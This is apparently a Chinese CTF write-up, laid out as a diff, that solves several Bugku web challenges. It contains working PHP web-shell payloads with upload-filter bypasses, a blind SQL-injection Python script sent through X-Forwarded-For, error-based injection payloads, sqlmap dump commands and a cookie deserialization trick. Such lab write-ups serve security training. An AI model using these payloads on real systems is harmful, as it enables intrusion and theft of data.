+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090245666.png" alt="image-20200528090245666"></p>
+<p>原始页面，代码审计</p>
+<p>题目上显示txt？？？？，尝试访问flag.txt看看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090259220.png" alt="image-20200528090259220"></p>
+<p>返回了内容flags。对代码进行分析</p>
+<p>$ac===$f，结合其他代码说明$f是文件名，$ac是文件内容，只有这样他们才能全等于</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090404175.png" alt="image-20200528090404175"></p>
+<p>这样就在URL中构造payload</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090629300.png" alt="image-20200528090629300"></p>
+<p>还有一种方法。</p>
+<p>1、ac不能为空</p>
+<p>2、f的值从fn中获取的</p>
+<p>3、ac的值要全等于f</p>
+<p>构造payload<code>?ac=123&amp;fn=php://input,,,,[PSOT]123</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091050880.png" alt="image-20200528091050880"></p>
+<h4 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091630704.png" alt="image-20200528091630704"></p>
+<p>查看原始页面，可以发现是404页面，显示错误。因为是直接显示错误，抓包什么的没有任何有用的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091651242.png" alt="image-20200528091651242"></p>
+<p>使用御剑扫描一下发现了这两个网站，第2个因为是index.php结尾，就是我们的初始访问的404页面所以无用，那就是第一个了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091927004.png" alt="image-20200528091927004"></p>
+<p>访问第一个网站，这是初始界面，可以看到给了一个resusl.php的文件，尝试访问一下。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092053317.png" alt="image-20200528092053317"></p>
+<p>居然进入到了后台，可以看到屏幕中显示你不是管理员你的IP已经被记录到日志了。<img src="https://gitee.com/zhanqiaozai/picture/raw/master/0064D4DD.gif" alt="img"></p>
+<p>卧槽，被记录了，但是在左下角有一串代码，而且题目给的提示是：想办法变成admin，尝试一下<code>?x=admin</code>试试，看看能否访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092201182.png" alt="image-20200528092201182"></p>
+<p>发现成功访问了，复制提交即可。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092535147.png" alt="image-20200528092535147"></p>
+<h4 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h4><p>打开网页</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210230364.png" alt="image-20200528210230364"></p>
+<p>查看原始页面，可以看到，标题让上传图片而不是php，这一看就是文件上传，构造一个文件上传的payload</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210252464.png" alt="image-20200528210252464"></p>
+<p>将其文件名改为png，jpg等图片文件后缀，然后进行上传</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210430305.png" alt="image-20200528210430305"></p>
+<p>上传后返回了图片上传的路径，复制路径到URL中，进行访问，看能否出现空白图片，因为这是伪造的图片所以是空白的不会显示任何内容</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210730378.png" alt="image-20200528210730378"></p>
+<p>将文件放到URL后，返回了空白图片，右键复制图片地址在菜刀或者蚁剑连接。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210816733.png" alt="image-20200528210816733"></p>
+<p>发现不管是蚁剑还是菜刀都连接不上，不管怎样修改都连接不上，可以猜测图片到后台被删除了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210853780.png" alt="image-20200528210853780"></p>
+<p>所以我们使用另一种方法，使用burp抓包试试，这里就可以将文件后缀改为php了，抓完包后将Type改为image/jpeg就可以</p>
+<p>经过测试php2, php3, php4, php5，phps, pht, phtm, phtml，只有php5才能绕过，这里用了黑名单过滤</p>
+<p>请求头部的Content-Type字段，进行大小写绕过，即把multipart/form-data中任意一个字母改成大写即可绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528211615205.png" alt="image-20200528211615205"></p>
+<h4 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h4><p>打开网页，可以看到题目给的源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614094836949.png" alt="image-20200614094836949"></p>
+<p>源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span class="line">$user&#x3D;&quot;&quot;;</span><br><span class="line">$pass&#x3D;&quot;&quot;;</span><br><span class="line">$db&#x3D;&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">echo &#39;your ip is :&#39;.$ip;</span><br><span class="line">$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
+
+<p>明确注入点，是走的http报头的x-forwarded-for。</p>
+<p>我尝试了bool型注入，发现自己构造的语句在自己数据库中会报错，但是这里并没有错误报告，因此考虑基于时间的盲注</p>
+<p>我之前时间延迟盲注都是用 if(exp1,exp2,epx3) 这种格式来完成的，但是这里的一段代码，相当于把 “,” 给过滤了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br></pre></td></tr></table></figure>
+
+<p>于是改变方法，用 case when exp1 then sleep(4) else 1 end 来绕过 “,”的限制</p>
+<p>exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制</p>
+<p>又拼接的语句为value(‘ 输入的内容 ‘)，最后的poc为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) #</span><br><span class="line"></span><br><span class="line">1&#39; and (case when (substr(select database())  from 1 for 1)&#x3D;&#39;c&#39; then sleep(4) else 1 end) #</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (&#39;  1&#39; and (case when (length((select database())) &#x3D; 14) then sleep(4) else 1 end) --  &#39;)</span><br></pre></td></tr></table></figure>
+
+<p>Python脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"># 基于时间的盲注，过滤了逗号 ,</span><br><span class="line">sql &#x3D; &quot;127.0.0.1&#39;+(select case when substr((select flag from flag) from &#123;0&#125; for 1)&#x3D;&#39;&#123;1&#125;&#39; then sleep(5) else 0 end))-- +&quot;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;123.206.87.240:8002&#x2F;web15&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(1, 40):</span><br><span class="line">    print(&#39;正在猜测：&#39;, str(i))</span><br><span class="line">    for ch in range(32, 129):</span><br><span class="line">        if ch &#x3D;&#x3D; 128:</span><br><span class="line">            sys.exit(0)</span><br><span class="line">        sqli &#x3D; sql.format(i, chr(ch))</span><br><span class="line">        # print(sqli)</span><br><span class="line">        header &#x3D; &#123;</span><br><span class="line">            &#39;X-Forwarded-For&#39;: sqli</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            html &#x3D; requests.get(url, headers&#x3D;header, timeout&#x3D;3)</span><br><span class="line">        except:</span><br><span class="line">            flag +&#x3D; chr(ch)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>最终得出结果是MD5值，解密就ok</p>
+<h4 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614095950785.png" alt="image-20200614095950785"></p>
+<p>查看源码</p>
+<p>是post提交，url明显提示是个sql注入，由于post提交，要sql和burp结合起来使用。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115515525.png" alt="image-20200614115515525"></p>
+<p>首先burp抓包，抓到包后选择存到txt文件中：（随便输入账号密码）</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115612664.png" alt="image-20200614115612664"></p>
+<p>我保存到了D盘的1.txt里。</p>
+<p>然后打开sqlmap，输入指令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -p admin_name --dbs</code></p>
+<p>解释一下 -r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（选了admin_name是注入点） –dbs意思是想获取数据库名字</p>
+<p>可以看到sqlmap获得了数据库的名字：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115646317.png" alt="image-20200614115646317"></p>
+<p>应该是这个bugkul1，再继续爆表，命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -p admin_name --tables</code></p>
+<p>解释：-D是表示选择了后面的这个数据库 –tables是想获取表</p>
+<p>可以看到爆出了表：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115709079.png" alt="image-20200614115709079"></p>
+<p>应该在flag1这个表里，继续爆列名：</p>
+<p>命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -p admin_name --columns</code></p>
+<p>解释类似上面 不过加了一个-T 指定表</p>
+<p>可以发现爆出了列名：</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115723998.png" alt="image-20200614115723998"></p>
+<p>flag1这个列 最后查字段 命令：<code>sqlmap.py -r &quot;D:\1.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</code>解释：同上面 –dump是获取字段的命令（在这过程中可能会让你选择Y或者N 我直接回车的）可以看到爆出了flag：<br><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614115746599.png" alt="image-20200614115746599"></p>
+<h4 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140048911.png" alt="image-20200614140048911"></p>
+<p>查看原始页面</p>
+<p>可以看到URL有一个 ?id=1，一看到这个第一时间想到的就是注入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614140649361.png" alt="image-20200614140649361"></p>
+<p>测试一下看看是不是</p>
+<p>使用万能单引号，发现页面返回错误，说明存在SQL注入。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141003167.png" alt="image-20200614141003167"></p>
+<p>使用注释符，查看页面返回，发现使用<code>#</code>还是返回错误，说明可能是<code>#</code>这个注释符被过滤了，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141056433.png" alt="image-20200614141056433"></p>
+<p>使用一下<code>--+</code>或者<code>%23</code>试试，页面返回正常。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141154522.png" alt="image-20200614141154522"></p>
+<p>查看字段数</p>
+<p>发现order by 都已经等于1了还是返回错误，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141234690.png" alt="image-20200614141234690"></p>
+<p>使用1’ or 1=1 –+ 看看页面返回，发现or被过滤了，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141512044.png" alt="image-20200614141512044"></p>
+<p>使用双写试试，页面返回正常说明可以双写绕过</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141540958.png" alt="image-20200614141540958"></p>
+<p>因为不知道那些被过滤了，所以测试一下and试试</p>
+<p>and也出错了，</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141623783.png" alt="image-20200614141623783"></p>
+<p>将and进行双写，发现页面返回正确</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141658004.png" alt="image-20200614141658004"></p>
+<p>这次知道了or 和 and被过滤了，将or双写查看字段数</p>
+<p>当字段为2的时候返回正常，3的时候页面返回错误</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141851898.png" alt="image-20200614141851898"></p>
+<p>查看注入点，嗯？报错了，经过测试发现union select也被过滤了，也要进行双写绕过一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614141937056.png" alt="image-20200614141937056"></p>
+<p>双写绕过，注入点是2</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142045859.png" alt="image-20200614142045859"></p>
+<p>查看数据库，当前数据库为<code>web1002-1</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142116577.png" alt="image-20200614142116577"></p>
+<p>查看表，不要忘记information中的or双写，可以看到获得的表为<code>flag1</code>和<code>hint</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142231685.png" alt="image-20200614142231685"></p>
+<p>查看flag1表中的内容，获得<code>flag1</code>and<code>address</code>这两个字段</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142336341.png" alt="image-20200614142336341"></p>
+<p>查看flag1这个字段，或得内容<code>usOwycTju+FTUUzXosjr</code>，这个数据提交是错误的，所以我们试试address字段</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142432801.png" alt="image-20200614142432801"></p>
+<p>查看address字段内容</p>
+<p>可以看到出现了一个下一关的地址，点击。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142552844.png" alt="image-20200614142552844"></p>
+<p>进去之后发现还有一个注入。</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142639683.png" alt="image-20200614142639683"></p>
+<p>在使用单引号</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142758306.png" alt="image-20200614142758306"></p>
+<p>加注释符</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142816295.png" alt="image-20200614142816295"></p>
+<p>查看字段</p>
+<p>字段为2的时候返回正常</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614142841780.png" alt="image-20200614142841780"></p>
+<p>查看注入点，把union过滤了，双写，大写小编码等 都不能绕过，因为有报错信息，那就用报错注入</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143008009.png" alt="image-20200614143008009"></p>
+<p>查看数据库</p>
+<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</code></p>
+<p>当前数据库为<code>web1002-2</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143304362.png" alt="image-20200614143304362"></p>
+<p>查看表</p>
+<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=&#39;web1002-2&#39;),0x7e),1) --+</code></p>
+<p>当前表名： ‘<del>class   ,   flag2</del>‘</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143619524.png" alt="image-20200614143619524"></p>
+<p>查看flag2表中的字段</p>
+<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&#39;flag2&#39;),0x7e),1) --+</code></p>
+<p>当前字段： ‘<del>flag2      ,    address</del>‘</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143746058.png" alt="image-20200614143746058"></p>
+<p>查看flag2字段内容</p>
+<p>payload：<code>-1&#39; and updatexml(1,concat(0x7e,(select group_concat(flag2)from flag2),0x7e),1) --+</code></p>
+<p>flag{Bugku-sql_6s-2i-4t-bug}</p>
+<p>将B改为b因为题目要求小写，如果大写提交的话会提示错误</p>
+<p>flag{bugku-sql_6s-2i-4t-bug}</p>
+<p>复制提交就ok</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614143904307.png" alt="image-20200614143904307"></p>
+<h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155227949.png" alt="image-20200614155227949"></p>
+<p>原始页面，什么也没有，查看源码看一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155308120.png" alt="image-20200614155308120"></p>
+<p>F12查看源码，可以看到一个upload.php，访问这个文件</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155405448.png" alt="image-20200614155405448"></p>
+<p>可以看到是上传文件的，这里一看加上文件名就知道这里是文件上传漏洞</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614155520631.png" alt="image-20200614155520631"></p>
+<p>构造一句话木马，这里不能使用普通的一句话<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>这个payload被过滤了，所以就要构造一个不被过滤的payload</p>
+<p>payload：<code>&lt;?php &lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;cmd&#39;]) &lt;/script&gt; ?&gt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160404812.png" alt="image-20200614160404812"></p>
+<p>复制payload，然后将文件后缀改为例：1.php;.jpg</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160104254.png" alt="image-20200614160104254"></p>
+<p>上传，访问红线处的内容，查看页面是否返回空白，页面只有访问的时候是空白的时候才能使用蚁剑或者菜刀连接成功</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160510438.png" alt="image-20200614160510438"></p>
+<p>复制链接，这里我使用的是蚁剑，使用蚁剑连接</p>
+<p>先添加数据，将URL粘贴上，密码就是一句话中POST里面的自己设置的值，测试连接后左下角出现成功就点击添加</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160546779.png" alt="image-20200614160546779"></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160700151.png" alt="image-20200614160700151"></p>
+<p>双击进入，可以看到这个最长的，他的文件名也非常像flag，双击进去查看</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160724363.png" alt="image-20200614160724363"></p>
+<p>发现flag确实在里面，复制提交就oK</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614160809061.png" alt="image-20200614160809061"></p>
+<p>还有一种方法将一句话构造成</p>
+<p><code>&lt;?php &lt;script language=&#39;php&#39;&gt;system(&#39;ls&#39;)&lt;/script&gt; ?&gt;</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161500776.png" alt="image-20200614161500776"></p>
+<p>还是将文件名改为1.php;.jpg</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161529154.png" alt="image-20200614161529154"></p>
+<p>提交之后返回路径，复制访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161547711.png" alt="image-20200614161547711"></p>
+<p>可以看到this_is_th3_F14g_154f65sd4g35f4d6f43.txt显示出来了，复制进行访问</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161620030.png" alt="image-20200614161620030"></p>
+<p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt文件夹</p>
+<p>成功返回falg</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614161658497.png" alt="image-20200614161658497"></p>
+<h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200230005.png" alt="image-20200614200230005"></p>
+<p>查看原始页面</p>
+<p>这里提交数据点击login是没有反应的，开始的时候题目给了提示hint，尝试给hint传参</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200300804.png" alt="image-20200614200300804"></p>
+<p>给hint随机传参，都会返回源码，分析源码</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200354802.png" alt="image-20200614200354802"></p>
+<p>源码</p>
+<p>这里的$KEY是没有赋值的，不管最底下的$KEY，因为没有赋值说明当前$KEY为NULL，因为前面有unserialize函数进行反序列化，所以这是反序列化之后的值为NULL，也就是当ISecer全等于$KEY的时候返回flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line"># cookie等于ISecer</span><br><span class="line">$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];</span><br><span class="line"></span><br><span class="line"># 判断hint不能为空</span><br><span class="line">if(isset($_GET[&#39;hint&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 判断cookie也就是ISecer是否等于$KEY,等于输出flag</span><br><span class="line">elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用在线php测试一下</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614200945836.png" alt="image-20200614200945836"></p>
+<p>复制上面的结果，然后因为之前ISecer是cookie的所以要再cookie中进行输入</p>
+<p>使用burp抓包发送到repeater模块进行修改，然后运行，成功返回flag</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201100734.png" alt="image-20200614201100734"></p>
+<p>这里不嫩将cookie和上面回车空开一行，否则不出flag</p>
+<p>例如：</p>
+<p>以为cookie和上面回车空了一行所以断开了，没有执行cookie就结束了</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614201150159.png" alt="image-20200614201150159"></p>
+<h4 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入 2"></a>sql注入 2</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214134741.png" alt="image-20200528214134741"></p>
+<p>原始页面，发现是登录界面，我们使用常用的弱口令试试能否登上，使用burp抓包一下，看看哪个是</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214112354.png" alt="image-20200528214112354"></p>
+<p>抓包后非常绝望，发现除了admin其他都是一样的，我们除了admin挨个尝试一下试试</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214307661.png" alt="image-20200528214307661"></p>
+<p>使用admin123，Wc，居然对了，登录进去了。。。。</p>
+<p>可以看到输入框有个ls … 我们照着输入一下试试</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214350284.png" alt="image-20200528214350284"></p>
+<p>输出后居然返回了flag。纯属蒙的</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528214512096.png" alt="image-20200528214512096"></p>
+<p>手注</p>
+<p>大佬的解题思路：<a href="https://blog.csdn.net/Mikasa_/article/details/87475337" target="_blank" rel="noopener">https://blog.csdn.net/Mikasa_/article/details/87475337</a></p>
+<p>还有一个也是瞎猜出来的，就是在URL上输入flag会直接跳转页面，显示flag值</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528220725088.png" alt="image-20200528220725088"></p>
+<h4 id="孙XX的博客"><a href="#孙XX的博客" class="headerlink" title="孙XX的博客"></a>孙XX的博客</h4><h5 id="不会"><a href="#不会" class="headerlink" title="不会"></a>不会</h5><h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><p>打开网址</p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200615104358427.png" alt="image-20200615104358427"></p>
+<p>查看原网址</p>
+<p>这里注册也没有用，所以用御剑扫一下看看有没有有用的地址</p>
